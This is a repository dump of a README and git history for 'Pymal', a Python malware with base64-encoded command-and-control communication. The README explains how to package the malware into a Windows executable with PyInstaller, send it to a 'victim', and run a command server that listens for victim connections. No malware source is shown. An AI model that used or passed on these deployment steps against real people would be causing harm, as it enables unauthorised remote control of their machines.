@@ -1,0 +1,56 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+Pymal
+==============
+
+Pymal is a Python malware with base64 encoded communication.
+
+# How to use 
+
+You have to generate an executable to send to the victim :
+
+## Generating malware Executables with PyInstaller:
+
+Linux: sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx
+Windows: http://www.activestate.com/activepython (fully packaged installer file)
+
+Install Pywin32, Setuptools, PyInstaller
+
+After install:
+
+Next we can run the following command to generate the python executable script: python pyintaller.py –onefile malware.py
+
+This will process the python script, pull the necessary import dependencies, and generate a new folder containing a malware.txt, a malware.spec, and a malware.exe. The malware.exe can now be used, and the .txt and .spec can be removed.
+
+After building the executable:
+
+The Python script has now been compiled into a Windows PE file and can be executed on Windows without using a Python interpreter.  This allows you to more easily move your code between instances of Windows without worrying about dependencies.
+
+Send The malware.exe to your friends (don't do that !!!)
+
+## Run the server
+
+Before sending the malware.exe to your friend you have to setup your server to listen to incomming connection from the Client (Victim). Change the IP and port and Run :
+
+```
+python Commandserver.py
+```
+====================== GIT HISTORY: ======================
+a0fef17 HEAD@{0}: clone: from https://github.com/abdesslem/pymal
+commit a0fef17684f5b60124c0037d93b8d06025f714f8
+Author: Abdesslem <abdesslem@accessnow.org>
+Date:   Sat Sep 5 02:06:40 2015 +0100
+
+    update the readme file
+
+commit 93f631030e052fdde9e80ae3cb660b1ce79d9f26
+Author: Abdesslem <abdesslem@accessnow.org>
+Date:   Sat Sep 5 01:55:30 2015 +0100
+
+    create simple malware and Command server
+
+commit ee9f16d054a2ed6ebdb2f513f7f918aa29d0821f
+Author: abdesslem <amriabdesslem@gmail.com>
+Date:   Sat Sep 5 01:46:46 2015 +0100
+
+    Initial commit
